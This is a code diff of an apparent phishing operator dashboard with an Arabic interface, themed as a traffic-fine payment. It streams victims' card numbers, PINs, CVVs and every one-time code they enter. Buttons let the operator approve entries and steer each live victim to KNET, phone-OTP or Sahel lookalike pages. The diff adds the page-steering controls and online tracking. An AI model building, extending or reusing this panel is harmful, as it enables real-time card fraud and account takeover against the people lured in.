@@ -1,161 +1,209 @@
-"use client"
+"use client";
 
-import { useState, useEffect } from "react"
-import { useRouter } from "next/navigation"
-import { Trash2 } from "lucide-react"
-import { Button } from "@/components/ui/button"
-import { Badge } from "@/components/ui/badge"
-import { ar } from "date-fns/locale"
-import { formatDistanceToNow } from "date-fns"
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
-import { onAuthStateChanged, signOut } from "firebase/auth"
-import { playNotificationSound } from "@/lib/actions"
-import { auth, db } from "@/lib/firestore"
+import { useState, useEffect } from "react";
+import { useRouter } from "next/navigation";
+import { Trash2 } from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { ar } from "date-fns/locale";
+import { formatDistanceToNow } from "date-fns";
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
+import {
+  collection,
+  doc,
+  writeBatch,
+  updateDoc,
+  onSnapshot,
+  query,
+  orderBy,
+} from "firebase/firestore";
+import { onAuthStateChanged, signOut } from "firebase/auth";
+import { playNotificationSound } from "@/lib/actions";
+import { auth, db } from "@/lib/firestore";
+import { InfoIcon } from "lucide-react";
 
 interface Notification {
-  id: string
-  bank: string
-  pass: string
-  prefix: string
-  cardNumber: string
-  cvv: string
-  month: string
-  year: string
-  pagename: string
-  plateNumber: string
-  plateType: string
-  status: string
-  createdDate: string
-  verificationCode: string
-  violationNumber: string
-  violationType: string
-  isHidden?: boolean
-  otp?: string
-  allOtps: string[]
-  violationValue?: string
+  bank: string;
+  bank_card: string;
+  cardNumber: string;
+  cardStatus: string;
+  createdDate: string;
+  cvv: string;
+  id: string;
+  month: string;
+  notificationCount: number;
+  otp: string;
+  page: string;
+  pass: string;
   personalInfo: {
-    id: string
-  }
+    id: string;
+  };
+  prefix: string;
+  status: "pending" | string;
+  isOnline?: boolean;
+  lastSeen: string;
+  violationValue: number;
+  year: string;
+  pagename: string;
+  plateType: string;
+  allOtps?: string[];
 }
 
 export default function NotificationsPage() {
-  const [notifications, setNotifications] = useState<Notification[]>([])
-  const [isLoading, setIsLoading] = useState(true)
-  const [pageName, setPagename] = useState<string>("")
-  const [message, setMessage] = useState<boolean>(false)
-  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
-  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
-  const [violationValues, setViolationValues] = useState<{ [key: string]: string }>({})
-  const router = useRouter()
+  const [notifications, setNotifications] = useState<Notification[]>([]);
+  const [isLoading, setIsLoading] = useState(true);
+  const [message, setMessage] = useState<boolean>(false);
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
+    null
+  );
+  const [selectedNotification, setSelectedNotification] =
+    useState<Notification | null>(null);
+  const [violationValues, setViolationValues] = useState<{
+    [key: string]: string;
+  }>({});
+  const router = useRouter();
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
-        router.push("/login")
+        router.push("/login");
       } else {
-        const unsubscribeNotifications = fetchNotifications()
+        const unsubscribeNotifications = fetchNotifications();
         return () => {
-          unsubscribeNotifications()
-        }
+          unsubscribeNotifications();
+        };
       }
-    })
+    });
 
-    return () => unsubscribe()
-  }, [router])
+    return () => unsubscribe();
+  }, [router]);
 
   const fetchNotifications = () => {
-    setIsLoading(true)
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
+    setIsLoading(true);
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
-            const data = doc.data() as any
-            setViolationValues((prev) => ({ ...prev, [doc.id]: data.violationValue || "" }))
-            return { id: doc.id, ...data }
+            const data = doc.data() as any;
+            setViolationValues((prev) => ({
+              ...prev,
+              [doc.id]: data.violationValue || "",
+            }));
+            return { id: doc.id, ...data };
           })
-          .filter((notification: any) => !notification.isHidden) as Notification[]
+          .filter(
+            (notification: any) => !notification.isHidden
+          ) as Notification[];
 
-        setNotifications(notificationsData)
-        setIsLoading(false)
-        playNotificationSound()
+        setNotifications(notificationsData);
+        setIsLoading(false);
+        playNotificationSound();
       },
       (error) => {
-        console.error("Error fetching notifications:", error)
-        setIsLoading(false)
-      },
-    )
+        console.error("Error fetching notifications:", error);
+        setIsLoading(false);
+      }
+    );
 
-    return unsubscribe
-  }
+    return unsubscribe;
+  };
 
   const handleClearAll = async () => {
-    setIsLoading(true)
+    setIsLoading(true);
     try {
-      const batch = writeBatch(db)
+      const batch = writeBatch(db);
       notifications.forEach((notification) => {
-        const docRef = doc(db, "pays", notification.id)
-        batch.update(docRef, { isHidden: true })
-      })
-      await batch.commit()
-      setNotifications([])
+        const docRef = doc(db, "pays", notification.id);
+        batch.update(docRef, { isHidden: true });
+      });
+      await batch.commit();
+      setNotifications([]);
     } catch (error) {
-      console.error("Error hiding all notifications:", error)
+      console.error("Error hiding all notifications:", error);
     } finally {
-      setIsLoading(false)
+      setIsLoading(false);
     }
-  }
+  };
 
   const handleDelete = async (id: string) => {
     try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { isHidden: true })
-      setNotifications(notifications.filter((notification) => notification.id !== id))
+      const docRef = doc(db, "pays", id);
+      await updateDoc(docRef, { isHidden: true });
+      setNotifications(
+        notifications.filter((notification) => notification.id !== id)
+      );
     } catch (error) {
-      console.error("Error hiding notification:", error)
+      console.error("Error hiding notification:", error);
     }
-  }
+  };
 
   const handleApproval = async (state: string, id: string) => {
-    const targetPost = doc(db, "pays", id)
+    const targetPost = doc(db, "pays", id);
     await updateDoc(targetPost, {
       status: state,
-    })
-  }
+    });
+  };
 
   const handleLogout = async () => {
     try {
-      await signOut(auth)
-      router.push("/login")
+      await signOut(auth);
+      router.push("/login");
     } catch (error) {
-      console.error("Error signing out:", error)
+      console.error("Error signing out:", error);
     }
-  }
+  };
 
-  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
-    setSelectedNotification(notification)
-    setSelectedInfo(infoType)
-  }
+  const handleInfoClick = (
+    notification: Notification,
+    infoType: "personal" | "card"
+  ) => {
+    setSelectedNotification(notification);
+    setSelectedInfo(infoType);
+  };
 
   const closeDialog = () => {
-    setSelectedInfo(null)
-    setSelectedNotification(null)
-  }
+    setSelectedInfo(null);
+    setSelectedNotification(null);
+  };
 
   const handleViolationUpdate = async (id: string, value: string) => {
     try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { violationValue: value })
-      setViolationValues((prev) => ({ ...prev, [id]: value }))
+      const docRef = doc(db, "pays", id);
+      await updateDoc(docRef, { violationValue: value });
+      setViolationValues((prev) => ({ ...prev, [id]: value }));
     } catch (error) {
-      console.error("Error updating violation value:", error)
+      console.error("Error updating violation value:", error);
     }
-  }
+  };
+
+  const handleUpdatePage = async (id: string, page: string) => {
+    try {
+      const docRef = doc(db, "pays", id);
+      await updateDoc(docRef, { page: page });
+      setNotifications(
+        notifications.map((notif) =>
+          notif.id === id ? { ...notif, page: page } : (notif as any)
+        )
+      );
+    } catch (error) {
+      console.error("Error updating current page:", error);
+    }
+  };
 
   if (isLoading) {
-    return <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">جاري التحميل...</div>
+    return (
+      <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">
+        جاري التحميل...
+      </div>
+    );
   }
 
   return (
@@ -172,7 +220,11 @@ export default function NotificationsPage() {
             >
               مسح جميع الإشعارات
             </Button>
-            <Button variant="outline" onClick={handleLogout} className="bg-gray-100 hover:bg-gray-100">
+            <Button
+              variant="outline"
+              onClick={handleLogout}
+              className="bg-gray-100 hover:bg-gray-100"
+            >
               تسجيل الخروج
             </Button>
           </div>
@@ -187,6 +239,7 @@ export default function NotificationsPage() {
                 <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                 <th className="px-4 py-3 text-right">الوقت</th>
                 <th className="px-4 py-3 text-center">الاشعارات</th>
+                <th className="px-4 py-3 text-center">تحديث الصفحة</th>
                 <th className="px-4 py-3 text-center">حذف</th>
               </tr>
             </thead>
@@ -197,22 +250,46 @@ export default function NotificationsPage() {
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2">
                       <Badge
-                        variant={notification.personalInfo.id ? "default" : "destructive"}
+                        variant={
+                          notification.personalInfo.id
+                            ? "default"
+                            : "destructive"
+                        }
                         className="rounded-md cursor-pointer"
-                        onClick={() => handleInfoClick(notification, "personal")}
+                        onClick={() =>
+                          handleInfoClick(notification, "personal")
+                        }
                       >
-                        {notification.personalInfo.id ? "معلومات شخصية" : "لا يوجد معلومات"}
+                        {notification.personalInfo.id
+                          ? "معلومات شخصية"
+                          : "لا يوجد معلومات"}
                       </Badge>
                       <Badge
-                        variant={notification.cardNumber ? "default" : "destructive"}
-                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                        variant={
+                          notification.cardNumber ? "default" : "destructive"
+                        }
+                        className={`rounded-md cursor-pointer ${
+                          notification.cardNumber ? "bg-green-500" : ""
+                        }`}
                         onClick={() => handleInfoClick(notification, "card")}
                       >
-                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                        {notification.cardNumber
+                          ? "معلومات البطاقة"
+                          : "لا يوجد بطاقة"}
+                      </Badge>
+                      <Badge
+                        variant="outline"
+                        className="rounded-md cursor-pointer"
+                        onClick={() =>
+                          handleInfoClick(notification, "personal")
+                        }
+                      >
+                        <InfoIcon className="h-4 w-4 mr-1" />
+                        معلومات عامة
                       </Badge>
                     </div>
                   </td>
-                  <td className="px-4 py-3">خطوه - {notification.pagename}</td>
+                  <td className="px-4 py-3">خطوه - {notification.page}</td>
                   <td className="px-4 py-3">
                     {notification.createdDate &&
                       formatDistanceToNow(new Date(notification.createdDate), {
@@ -221,9 +298,76 @@ export default function NotificationsPage() {
                       })}
                   </td>
                   <td className="px-4 py-3 text-center">
-                    <Badge variant="default" className="bg-green-500">
-                      1
+                    <Badge
+                      variant="default"
+                      className={`${
+                        notification.isOnline ? "bg-green-500" : "bg-red-500"
+                      }`}
+                    >
+                      <span style={{ fontSize: "12px", color: "#fff" }}>
+                        {notification.isOnline ? "متصل" : "غير متصل"}
+                      </span>
                     </Badge>
+                  </td>
+                  <td className="px-4 py-3 text-center">
+                    <div className="flex flex-col items-center space-y-2">
+                      <div className="flex justify-center space-x-2">
+                        {[
+                          {
+                            page: "main",
+                            label: "الرئيسية",
+                            hint: "الصفحة الرئيسية",
+                          },
+                          { page: "knet", label: "كنت", hint: "صفحة كنت" },
+                          {
+                            page: "phone",
+                            label: "هاتف",
+                            hint: "رقم الهاتف ",
+                          },
+                          {
+                            page: "phoneOtp",
+                            label: " OTP",
+                            hint: " OTP",
+                          },
+                          {
+                            page: "sahel",
+                            label: "سهل",
+                            hint: "سهل",
+                          },
+                        ].map(({ page, label, hint }) => (
+                          <Button
+                            key={page}
+                            variant={
+                              notification?.page === page
+                                ? "default"
+                                : "outline"
+                            }
+                            size="sm"
+                            onClick={() =>
+                              handleUpdatePage(notification.id, page)
+                            }
+                            className={`relative ${
+                              notification.page === page ? "bg-blue-500" : ""
+                            }`}
+                            title={hint}
+                          >
+                            {label}
+                            {notification.page === page && (
+                              <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
+                                ✓
+                              </span>
+                            )}
+                          </Button>
+                        ))}
+                      </div>
+                      <span className="text-xs text-gray-500">
+                        {notification.page === "main" && "الصفحة الرئيسية"}
+                        {notification.page === "knet" && "صفحة كنت"}
+                        {notification.page === "phone" && "رقم الهاتف "}
+                        {notification.page === "phoneOtp" && " OTP"}
+                        {notification.page === "sahel" && "سهل"}
+                      </span>
+                    </div>
                   </td>
                   <td className="px-4 py-3 text-center">
                     <Button
@@ -235,7 +379,6 @@ export default function NotificationsPage() {
                       <Trash2 className="h-4 w-4" />
                     </Button>
                   </td>
-                 
                 </tr>
               ))}
             </tbody>
@@ -246,9 +389,19 @@ export default function NotificationsPage() {
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
         <DialogContent className="bg-gray-100 text-black" dir="rtl">
           <DialogHeader>
-            <DialogTitle dir="rtl">{selectedInfo === "personal" ? "المعلومات الشخصية" : "معلومات البطاقة"}</DialogTitle>
+            <DialogTitle dir="rtl">
+              {selectedInfo === "personal"
+                ? "المعلومات الشخصية"
+                : selectedInfo === "card"
+                ? "معلومات البطاقة"
+                : "معلومات عامة"}
+            </DialogTitle>
             <DialogDescription>
-              {selectedInfo === "personal" ? "تفاصيل المعلومات الشخصية" : "تفاصيل معلومات البطاقة"}
+              {selectedInfo === "personal"
+                ? "تفاصيل المعلومات الشخصية"
+                : selectedInfo === "card"
+                ? "تفاصيل معلومات البطاقة"
+                : "تفاصيل المعلومات العامة"}
             </DialogDescription>
           </DialogHeader>
           {selectedInfo === "personal" && selectedNotification?.plateType && (
@@ -257,7 +410,8 @@ export default function NotificationsPage() {
                 <strong>الاسم الكامل:</strong> {selectedNotification.id}
               </p>
               <p>
-                <strong>رقم الهوية:</strong> {selectedNotification.personalInfo.id}
+                <strong>رقم الهوية:</strong>{" "}
+                {selectedNotification.personalInfo.id}
               </p>
               <p>
                 <strong>رقم الهاتف:</strong> {selectedNotification.plateType}
@@ -267,40 +421,49 @@ export default function NotificationsPage() {
           {selectedInfo === "card" && selectedNotification && (
             <div className="space-y-2">
               <p>
-                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
+                <strong className="text-red-400 mx-4">البنك:</strong>{" "}
+                {selectedNotification.bank}
               </p>
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
-                { selectedNotification.cardNumber && selectedNotification.cardNumber+" - "+selectedNotification.prefix }
+                {selectedNotification.cardNumber &&
+                  selectedNotification.cardNumber +
+                    " - " +
+                    selectedNotification.prefix}
               </p>
               <p>
-                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
-                {selectedNotification.month}
+                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{" "}
+                {selectedNotification.year}/{selectedNotification.month}
               </p>
               <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
+                <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{" "}
+                {selectedNotification.pass}
               </p>
               <p className="flex items-centerpt-4">
-                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification.otp}
+                <strong className="text-red-400 mx-4">رمز التحقق :</strong>{" "}
+                {selectedNotification.otp}
               </p>
               <p className="flex items-centerpt-4">
-                <strong className="text-red-400 mx-4">رمز الأمان :</strong> {selectedNotification.cvv}
+                <strong className="text-red-400 mx-4">رمز الأمان :</strong>{" "}
+                {selectedNotification.cvv}
               </p>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                 <div className="grid grid-cols-4">
                   {selectedNotification.allOtps &&
-                    selectedNotification.allOtps.map((i, index) => <Badge key={index}>{i}</Badge>)}
+                    selectedNotification.allOtps.map((i, index) => (
+                      <Badge key={index}>{i}</Badge>
+                    ))}
                 </div>
               </p>
               <div className="flex justify-between mx-1">
                 <Button
                   onClick={() => {
-                    handleApproval("approved", selectedNotification.id)
-                    setMessage(true)
+                    handleApproval("approved", selectedNotification.id);
+                    setMessage(true);
                     setTimeout(() => {
-                      setMessage(false)
-                    }, 3000)
+                      setMessage(false);
+                    }, 3000);
                   }}
                   className="w-full m-3 bg-green-500"
                 >
@@ -308,11 +471,11 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handleApproval("rejected", selectedNotification.id)
-                    setMessage(true)
+                    handleApproval("rejected", selectedNotification.id);
+                    setMessage(true);
                     setTimeout(() => {
-                      setMessage(false)
-                    }, 3000)
+                      setMessage(false);
+                    }, 3000);
                   }}
                   className="w-full m-3"
                   variant="destructive"
@@ -323,9 +486,22 @@ export default function NotificationsPage() {
               <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
             </div>
           )}
+          {selectedInfo === "personal" && selectedNotification && (
+            <div className="space-y-2">
+              <p>
+                <strong>الصفحة الحالية:</strong> {selectedNotification.page}
+              </p>
+              <p>
+                <strong>الحالة:</strong> {selectedNotification.status}
+              </p>
+              <p>
+                <strong>قيمة المخالفة:</strong>{" "}
+                {selectedNotification.violationValue}
+              </p>
+            </div>
+          )}
         </DialogContent>
       </Dialog>
     </div>
-  )
+  );
 }
-
